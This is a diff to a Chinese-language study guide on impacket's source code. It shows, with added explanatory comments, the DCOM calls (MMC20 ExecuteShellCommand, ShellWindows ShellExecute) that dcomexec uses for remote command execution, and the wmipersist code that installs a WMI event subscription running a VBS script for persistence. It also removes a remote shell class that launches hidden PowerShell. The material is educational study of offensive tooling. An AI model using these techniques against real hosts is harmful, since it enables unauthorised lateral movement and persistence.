@@ -4451,41 +4046,23 @@ class DCOMEXEC:
                       target=interface.get_target()))
 
     def run(self, addr, silentCommand=False):
-        if self.__noOutput is False and silentCommand is False:
-            smbConnection = SMBConnection(addr, addr)
-            if self.__doKerberos is False:
-                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
-            else:
-                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
-                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
-
-            dialect = smbConnection.getDialect()
-            if dialect == SMB_DIALECT:
-                logging.info("SMBv1 dialect used")
-            elif dialect == SMB2_DIALECT_002:
-                logging.info("SMBv2.0 dialect used")
-            elif dialect == SMB2_DIALECT_21:
-                logging.info("SMBv2.1 dialect used")
-            else:
-                logging.info("SMBv3.0 dialect used")
-        else:
-            smbConnection = None
-
+        ......
+        # ① 建立 DCOM 连接（内部完成 EPM 解析、SCM 激活与 OXID 解析）
         dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                               self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
         try:
-            dispParams = DISPPARAMS(None, False)
-            dispParams['rgvarg'] = NULL
-            dispParams['rgdispidNamedArgs'] = NULL
-            dispParams['cArgs'] = 0
-            dispParams['cNamedArgs'] = 0
+            dispParams = DISPPARAMS(None, False)   # Invoke 调用的通用参数容器
+            ......
 
             if self.__dcomObject == 'ShellWindows':
+                # ② 按 CLSID 激活 DCOM 组件，拿到默认的 IDispatch 接口
                 # ShellWindows CLSID (Windows 7, Windows 10, Windows Server 2012R2)
                 iInterface = dcom.CoCreateInstanceEx(string_to_bin('9BA05972-F6A8-11CF-A442-00A0C90A8F39'), IID_IDispatch)
                 iMMC = IDispatch(iInterface)
+                # ③ GetIDsOfNames：方法/属性名 → DISPID；Invoke：按 DISPID 调用
                 resp = iMMC.GetIDsOfNames(('Item',))
                 resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
+                # ④ 属性返回的是封送接口指针，经 getInterface 解 OBJREF 还原为新接口
                 iItem = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
                 resp = iItem.GetIDsOfNames(('Document',))
                 resp = iItem.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
@@ -4498,18 +4075,12 @@ class DCOMEXEC:
                 resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
                 pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
             elif self.__dcomObject == 'MMC20':
-                iInterface = dcom.CoCreateInstanceEx(string_to_bin('49B2791A-B1AE-4C90-9B8E-E860BA07F889'), IID_IDispatch)
-                iMMC = IDispatch(iInterface)
-                resp = iMMC.GetIDsOfNames(('Document',))
-                resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
-                pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
-            else:
-                logging.fatal('Invalid object %s' % self.__dcomObject)
-                return
+                ......
 
             iDocument = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
 
             if self.__dcomObject == 'MMC20':
+                # ⑤ MMC20：Document.ActiveView.ExecuteShellCommand(...) 执行命令
                 resp = iDocument.GetIDsOfNames(('ActiveView',))
                 resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
@@ -4517,278 +4088,17 @@ class DCOMEXEC:
                 pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]
                 self.shell = RemoteShellMMC20(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection, self.__shell_type, silentCommand)
             else:
+                # ⑤ ShellWindows/ShellBrowserWindow：Document.Application.ShellExecute(...) 执行命令
                 resp = iDocument.GetIDsOfNames(('Application',))
                 resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
                 iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
                 pExecuteShellCommand = iActiveView.GetIDsOfNames(('ShellExecute',))[0]
                 self.shell = RemoteShell(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection, self.__shell_type, silentCommand)
-
-            if self.__command != ' ':
-                try:
-                    self.shell.onecmd(self.__command)
-                except TypeError:
-                    if not silentCommand:
-                        raise
-                if self.shell is not None:
-                    self.shell.do_exit('')
-            else:
-                self.shell.cmdloop()
-        except  (Exception, KeyboardInterrupt) as e:
-            if logging.getLogger().level == logging.DEBUG:
-                import traceback
-                traceback.print_exc()
-            if self.shell is not None:
-                self.shell.do_exit('')
-            logging.error(str(e))
-            if smbConnection is not None:
-                smbConnection.logoff()
-            dcom.disconnect()
-            sys.stdout.flush()
-            sys.exit(1)
-
-        if smbConnection is not None:
-            smbConnection.logoff()
-        dcom.disconnect()
-
-class RemoteShell(cmd.Cmd):
-    def __init__(self, share, quit, executeShellCommand, smbConnection, shell_type, silentCommand=False):
-        cmd.Cmd.__init__(self)
-        self._share = share
-        self._output = '\\' + OUTPUT_FILENAME
-        self.__outputBuffer = ''
-        self._shell = 'cmd.exe'
-        self.__shell_type = shell_type
-        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
-        self.__quit = quit
-        self._executeShellCommand = executeShellCommand
-        self.__transferClient = smbConnection
-        self._silentCommand = silentCommand
-        self._pwd = 'C:\\windows\\system32'
-        self._noOutput = False
-        self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'
-
-        # We don't wanna deal with timeouts from now on.
-        if self.__transferClient is not None:
-            self.__transferClient.setTimeout(100000)
-            self.do_cd('\\')
-        else:
-            self._noOutput = True
-
-    def do_shell(self, s):
-        os.system(s)
-
-    def do_help(self, line):
-        print("""
- lcd {path}                 - changes the current local directory to {path}
- exit                       - terminates the server process (and this session)
- lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
- lget {file}                 - downloads pathname to the current local dir
- ! {cmd}                    - executes a local shell cmd
-""")
-
-    def do_lcd(self, s):
-        if s == '':
-            print(os.getcwd())
-        else:
-            try:
-                os.chdir(s)
-            except Exception as e:
-                logging.error(str(e))
-
-    def do_lget(self, src_path):
-        try:
-            import ntpath
-            newPath = ntpath.normpath(ntpath.join(self._pwd, src_path))
-            drive, tail = ntpath.splitdrive(newPath)
-            filename = ntpath.basename(tail)
-            fh = open(filename,'wb')
-            logging.info("Downloading %s\\%s" % (drive, tail))
-            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
-            fh.close()
-        except Exception as e:
-            logging.error(str(e))
-            os.remove(filename)
-            pass
-
-    def do_lput(self, s):
-        try:
-            params = s.split(' ')
-            if len(params) > 1:
-                src_path = params[0]
-                dst_path = params[1]
-            elif len(params) == 1:
-                src_path = params[0]
-                dst_path = ''
-
-            src_file = os.path.basename(src_path)
-            fh = open(src_path, 'rb')
-            dst_path = dst_path.replace('/','\\')
-            import ntpath
-            pathname = ntpath.join(ntpath.join(self._pwd, dst_path), src_file)
-            drive, tail = ntpath.splitdrive(pathname)
-            logging.info("Uploading %s to %s" % (src_file, pathname))
-            self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
-            fh.close()
-        except Exception as e:
-            logging.critical(str(e))
-            pass
-
-    def do_exit(self, s):
-        dispParams = DISPPARAMS(None, False)
-        dispParams['rgvarg'] = NULL
-        dispParams['rgdispidNamedArgs'] = NULL
-        dispParams['cArgs'] = 0
-        dispParams['cNamedArgs'] = 0
-
-        self.__quit[0].Invoke(self.__quit[1], 0x409, DISPATCH_METHOD, dispParams,
-                                             0, [], [])
-        return True
-
-    def do_EOF(self, s):
-        print()
-        return self.do_exit(s)
-
-    def emptyline(self):
-        return False
-
-    def do_cd(self, s):
-        self.execute_remote('cd ' + s)
-        if len(self.__outputBuffer.strip('\r\n')) > 0:
-            print(self.__outputBuffer)
-            self.__outputBuffer = ''
-        else:
-            if PY2:
-                self._pwd = ntpath.normpath(ntpath.join(self._pwd, s.decode(sys.stdin.encoding)))
-            else:
-                self._pwd = ntpath.normpath(ntpath.join(self._pwd, s))
-            self.execute_remote('cd ')
-            self._pwd = self.__outputBuffer.strip('\r\n')
-            self.prompt = (self._pwd + '>')
-            if self.__shell_type == 'powershell':
-                    self.prompt = 'PS ' + self.prompt + ' '
-            self.__outputBuffer = ''
-
-    def default(self, line):
-        # Let's try to guess if the user is trying to change drive
-        if len(line) == 2 and line[1] == ':':
-            # Execute the command and see if the drive is valid
-            self.execute_remote(line)
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                # Something went wrong
-                print(self.__outputBuffer)
-                self.__outputBuffer = ''
-            else:
-                # Drive valid, now we should get the current path
-                self._pwd = line
-                self.execute_remote('cd ')
-                self._pwd = self.__outputBuffer.strip('\r\n')
-                self.prompt = (self._pwd + '>')
-                if self.__shell_type == 'powershell':
-                    self.prompt = 'PS ' + self.prompt + ' '
-                self.__outputBuffer = ''
-        else:
-            if line != '':
-                self.send_data(line)
-
-    def get_output(self):
-        def output_callback(data):
-            try:
-                self.__outputBuffer += data.decode(CODEC)
-            except UnicodeDecodeError:
-                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
-                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute dcomexec.py '
-                              'again with -codec and the corresponding codec')
-                self.__outputBuffer += data.decode(CODEC, errors='replace')
-
-        if self._noOutput is True:
-            self.__outputBuffer = ''
-            return
-
-        while True:
-            try:
-                self.__transferClient.getFile(self._share, self._output, output_callback)
-                break
-            except Exception as e:
-                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
-                    # Output not finished, let's wait
-                    time.sleep(1)
-                    pass
-                elif str(e).find('Broken') >= 0:
-                    # The SMB Connection might have timed out, let's try reconnecting
-                    logging.debug('Connection broken, trying to recreate it')
-                    self.__transferClient.reconnect()
-                    return self.get_output()
-        self.__transferClient.deleteFile(self._share, self._output)
-
-    def execute_remote(self, data, shell_type='cmd'):
-        if self._silentCommand is True:
-            self._shell = data.split()[0]
-            command = ' '.join(data.split()[1:])
-        else:
-            if shell_type == 'powershell':
-                data = '$ProgressPreference="SilentlyContinue";' + data
-                data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
-            command = '/Q /c ' + data
-
-        if self._noOutput is False:
-            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self._share + self._output + ' 2>&1'
-
-        logging.debug('Executing: %s' % command)
-
-        dispParams = DISPPARAMS(None, False)
-        dispParams['rgdispidNamedArgs'] = NULL
-        dispParams['cArgs'] = 5
-        dispParams['cNamedArgs'] = 0
-        arg0 = VARIANT(None, False)
-        arg0['clSize'] = 5
-        arg0['vt'] = VARENUM.VT_BSTR
-        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg0['_varUnion']['bstrVal']['asData'] = self._shell
-
-        arg1 = VARIANT(None, False)
-        arg1['clSize'] = 5
-        arg1['vt'] = VARENUM.VT_BSTR
-        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
-        if PY3:
-            arg1['_varUnion']['bstrVal']['asData'] = command
-        else:
-            arg1['_varUnion']['bstrVal']['asData'] = command.decode(sys.stdin.encoding)
-
-        arg2 = VARIANT(None, False)
-        arg2['clSize'] = 5
-        arg2['vt'] = VARENUM.VT_BSTR
-        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg2['_varUnion']['bstrVal']['asData'] = self._pwd
-
-        arg3 = VARIANT(None, False)
-        arg3['clSize'] = 5
-        arg3['vt'] = VARENUM.VT_BSTR
-        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg3['_varUnion']['bstrVal']['asData'] = ''
-
-        arg4 = VARIANT(None, False)
-        arg4['clSize'] = 5
-        arg4['vt'] = VARENUM.VT_BSTR
-        arg4['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg4['_varUnion']['bstrVal']['asData'] = '0'
-        dispParams['rgvarg'].append(arg4)
-        dispParams['rgvarg'].append(arg3)
-        dispParams['rgvarg'].append(arg2)
-        dispParams['rgvarg'].append(arg1)
-        dispParams['rgvarg'].append(arg0)
-
-        #print(dispParams.dump())
-
-        self._executeShellCommand[0].Invoke(self._executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams,
-                                            0, [], [])
-        self.get_output()
-
-    def send_data(self, data):
-        self.execute_remote(data, self.__shell_type)
-        print(self.__outputBuffer)
-        self.__outputBuffer = ''
+            ......
 ```
+
+> 摘录说明：以上保留 `getInterface` 的 OBJREF 分发与 `run()` 中三个 DCOM 组件的激活、属性链与命令执行路径。dcomexec 源码中另有的 `RemoteShell` / `RemoteShellMMC20` 半交互 shell（约 300 行，负责命令回显的 SMB 文件读写、编解码与提示符管理）与本文教学点无关，此处略去，完整实现见 examples/dcomexec.py。
 
 0x409 是美式英文的区域 ID（LCID）。
 
@@ -4942,6 +4252,7 @@ class IVdsService(IRemUnknown2):
         IRemUnknown2.__init__(self, interface)
 
     def IsServiceReady(self):
+        # 样板模式：request → 异常时从异常对象取响应包（e.get_packet()）
         request = IVdsService_IsServiceReady()
         request['ORPCthis'] = self.get_cinstance().get_ORPCthis()
         request['ORPCthis']['flags'] = 0
@@ -4951,28 +4262,17 @@ class IVdsService(IRemUnknown2):
             resp = e.get_packet()
         return resp 
 
-    def WaitForServiceReady(self):
-        request = IVdsService_WaitForServiceReady()
-        request['ORPCthis'] = self.get_cinstance().get_ORPCthis()
-        request['ORPCthis']['flags'] = 0
-        resp = self.request(request, uuid = self.get_iPid())
-        return resp 
-
-    def GetProperties(self):
-        request = IVdsService_GetProperties()
-        request['ORPCthis'] = self.get_cinstance().get_ORPCthis()
-        request['ORPCthis']['flags'] = 0
-        resp = self.request(request, uuid = self.get_iPid())
-        return resp 
+    ......
 
     def QueryProviders(self, masks):
+        # 查询提供程序：返回可枚举的 IEnumVdsObject，
+        # 后续枚举出的每个对象同样是 IRemUnknown2 子类接口
         request = IVdsService_QueryProviders()
         request['ORPCthis'] = self.get_cinstance().get_ORPCthis()
         request['ORPCthis']['flags'] = 0
         request['masks'] = masks
         resp = self.request(request, uuid = self.get_iPid())
         return IEnumVdsObject(INTERFACE(self.get_cinstance(), ''.join(resp['ppEnum']['abData']), self.get_ipidRemUnknown(), target = self.get_target()))
-
 ```
 
 #### 6.3.5 [MS-WMI] wmi.py
@@ -5262,61 +4562,41 @@ class IWbemServices(IRemUnknown):
 
 ```python
  if self.__options.action.upper() == 'REMOVE':
+            # 卸载：逐个删除四类实例（Consumer / Filter / Timer / Binding）
             self.checkError('Removing ActiveScriptEventConsumer %s' % self.__options.name,
                             iWbemServices.DeleteInstance('ActiveScriptEventConsumer.Name="%s"' % self.__options.name))
+            ......   # 同样方式删除 __EventFilter、__IntervalTimerInstruction、__FilterToConsumerBinding
 
-            self.checkError('Removing EventFilter EF_%s' % self.__options.name,
-                            iWbemServices.DeleteInstance('__EventFilter.Name="EF_%s"' % self.__options.name))
-
-            self.checkError('Removing IntervalTimerInstruction TI_%s' % self.__options.name,
-                            iWbemServices.DeleteInstance(
-                                '__IntervalTimerInstruction.TimerId="TI_%s"' % self.__options.name))
-
-            self.checkError('Removing FilterToConsumerBinding %s' % self.__options.name,
-                            iWbemServices.DeleteInstance(
-                                r'__FilterToConsumerBinding.Consumer="ActiveScriptEventConsumer.Name=\"%s\"",'
-                                r'Filter="__EventFilter.Name=\"EF_%s\""' % (
-                                self.__options.name, self.__options.name)))
         else:
+            # 安装：① GetObject 取类定义 → SpawnInstance 派生实例 → 填属性 → PutInstance 写入
             activeScript, _ = iWbemServices.GetObject('ActiveScriptEventConsumer')
             activeScript = activeScript.SpawnInstance()
             activeScript.Name = self.__options.name
-            activeScript.ScriptingEngine = 'VBScript'
-            activeScript.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
-            activeScript.ScriptText = options.vbs.read()
+            activeScript.ScriptingEngine = 'VBScript'          # 以 VBScript 作为事件触发载荷
+            activeScript.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]   # Creator SID
+            activeScript.ScriptText = options.vbs.read()       # 恶意 VBS 脚本体
             self.checkError('Adding ActiveScriptEventConsumer %s'% self.__options.name, 
                 iWbemServices.PutInstance(activeScript.marshalMe()))
-        
-            if options.filter is not None:
-                eventFilter, _ = iWbemServices.GetObject('__EventFilter')
-                eventFilter = eventFilter.SpawnInstance()
-                eventFilter.Name = 'EF_%s' % self.__options.name
-                eventFilter.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
-                eventFilter.Query = options.filter
-                eventFilter.QueryLanguage = 'WQL'
-                eventFilter.EventNamespace = r'root\cimv2'
-                self.checkError('Adding EventFilter EF_%s' % self.__options.name,
-                    iWbemServices.PutInstance(eventFilter.marshalMe()))
 
+            if options.filter is not None:
+                ......   # __EventFilter：指定 WQL 查询与所在命名空间 root\cimv2
             else:
                 wmiTimer, _ = iWbemServices.GetObject('__IntervalTimerInstruction')
                 wmiTimer = wmiTimer.SpawnInstance()
                 wmiTimer.TimerId = 'TI_%s' % self.__options.name
-                wmiTimer.IntervalBetweenEvents = int(self.__options.timer)
-                #wmiTimer.SkipIfPassed = False
+                wmiTimer.IntervalBetweenEvents = int(self.__options.timer)    # 定时器间隔
                 self.checkError('Adding IntervalTimerInstruction',
                     iWbemServices.PutInstance(wmiTimer.marshalMe()))
 
                 eventFilter,_ = iWbemServices.GetObject('__EventFilter')
                 eventFilter =  eventFilter.SpawnInstance()
                 eventFilter.Name = 'EF_%s' % self.__options.name
-                eventFilter.CreatorSID =  [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
                 eventFilter.Query = 'select * from __TimerEvent where TimerID = "TI_%s" ' % self.__options.name
                 eventFilter.QueryLanguage = 'WQL'
                 eventFilter.EventNamespace = r'root\subscription'
-                self.checkError('Adding EventFilter EF_%s' % self.__options.name,
-                    iWbemServices.PutInstance(eventFilter.marshalMe()))
+                ......
 
+            # ② 绑定 Filter → Consumer，事件发生时执行脚本
             filterBinding, _ = iWbemServices.GetObject('__FilterToConsumerBinding')
             filterBinding = filterBinding.SpawnInstance()
             filterBinding.Filter = '__EventFilter.Name="EF_%s"' % self.__options.name
@@ -5366,67 +4646,67 @@ wmipersist.py 的作用是构造 WQL 事件查询监听事件，当事件发生�
 
 这里的模块是 impacket 的基础模块，快速过一遍即可。
 
-### ICMP6.py
+### ICMP6.py — IPv6 Ping
 
 实现了impacket对ipv6服务器的ping的支持
 
-### IP6_Address.py
+### IP6_Address.py — IPv6 地址解析
 
 实现了对ipv6地址的解析
 
-### IP6.py
+### IP6.py — IPv6 协议
 
 实现了ipv6协议支持
 
-### IP6_Extension_Headers.py
+### IP6_Extension_Headers.py — IPv6 扩展头
 
 实现了对ipv6扩展标头的支持
 
-### version.py
+### version.py — 版本信息
 
 输出当前impacket版本信息
 
-### Dot11Crypto.py
+### Dot11Crypto.py — 802.11 RC4 加解密
 
 rc4加解密算法实现
 
-### Dot11KeyManager.py
+### Dot11KeyManager.py — 802.11 密钥管理
 
 802.11协议（wifi）keymanager支持
 
-### ImpactDecoder.py
+### ImpactDecoder.py — 网络协议解包器
 
 各种网络协议的便捷数据包解包器。解包各种协议
 
-### ImpactPacket.py
+### ImpactPacket.py — 低级数据包编解码
 
 网络数据包编解码器基本构建块。各种 Internet 协议的低级数据包编解码器。以编程方式构建网络数据包
 
-### NDP.py
+### NDP.py — IPv6 邻居发现
 
 ipv6中的邻居发现协议ndp支持，即Neighbor Discovery Protocol
 
-### cdp.py
+### cdp.py — Cisco Discovery Protocol
 
 cdp协议支持，CDP是Cisco Discovery Protocol的缩写，它是由思科公司推出的一种私有的二层网络协议，它能够运行在大部分的思科设备上面。 通过运行CDP 协议，思科设备能够在与它们直连的设备之间分享有关操作系统软件版本，以及IP地址，硬件平台等相关信息。
 
-### crypto.py
+### crypto.py — AES-CMAC 等通用算法（SMB3 签名）
 
 AES-CMAC 等通用加密校验算法实现（供 SMB3 签名等场景调用，与 krb5/crypto.py 分工不同）
 
-### dhcp.py
+### dhcp.py — DHCP 协议
 
 dhcp协议支持
 
-### dns.py
+### dns.py — DNS 协议
 
 dns协议支持
 
-### dot11.py
+### dot11.py — 802.11 协议
 
 802.11协议（wifi）支持
 
-### dpapi.py
+### dpapi.py — Windows 数据保护 API（Chrome 凭据解密）
 
 dpapi支持，**数据保护应用程序编程接口**(DPAPI)。**DPAPI**目前广泛应用于许多 Windows 应用程序和子系统中。例如，在文件加密系统中，用于存储无线连接密码，在 Windows Credential Manager、Internet Explorer、Outlook、Skype、Windows CardSpace、Windows Vault、Google Chrome 等中。使用简单，因为它仅包含几个用于加密和解密数据的函数，**CryptProtectData**和**CryptUnprotectData**。
 
@@ -5441,71 +4721,71 @@ https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13
 
 https://paper.seebug.org/1755/#2-windowsdpapi
 
-### eap.py
+### eap.py — 802.1X 认证
 
 wifi 802.11认证协议支持
 
-### ese.py
+### ese.py — NTDS.dit 数据库解析
 
 解析NTDS.dit
 
-### helper.py
+### helper.py — 数据包基础类型
 
 数据包基础数据类型定义，如bit、byte等
 
-### hresult_errors.py
+### hresult_errors.py — Windows 错误代码表
 
 windows错误代码汇总
 
-### http.py
+### http.py — RPC over HTTP 401 认证
 
 提供rpc via http v2 中http 401 认证的支持
 
-### mapi_constants.py
+### mapi_constants.py — Exchange MAPI 常量
 
 exchange错误代码及mapi属性
 
-### mqtt.py
+### mqtt.py — MQTT 协议
 
 mqtt协议支持
 
-### nmb.py
+### nmb.py — NetBIOS 名称服务
 
 NetBIOS 库
 
-### smb3.py
+### smb3.py — SMB2/3 协议实现
 
 MS-SMB2协议实现（SMB2 和 SMB3）
 
-### smb3structs.py
+### smb3structs.py — SMB2/3 数据结构
 
 SMB 2 和 3 协议结构和常量 [MS-SMB2]
 
-### smbconnection.py
+### smbconnection.py — SMB 连接包装类
 
 SMB1/2/3 的包装类，smb连接的实现
 
-### smbserver.py
+### smbserver.py — SMB 服务器
 
 smb服务器实现
 
-### system_errors.py
+### system_errors.py — 系统错误代码表
 
 系统错误代码汇总
 
-### tds.py
+### tds.py — SQL Server TDS 协议
 
 sql server 协议支持
 
-### uuid.py
+### uuid.py — UUID 与二进制互转
 
 uuid和二进制表示的相互转换
 
-### winregistry.py
+### winregistry.py — Windows 注册表解析
 
 Windows 注册表库解析器
 
-### wps.py
+### wps.py — WPS / WSC 无线配置
 
 wps协议支持
 
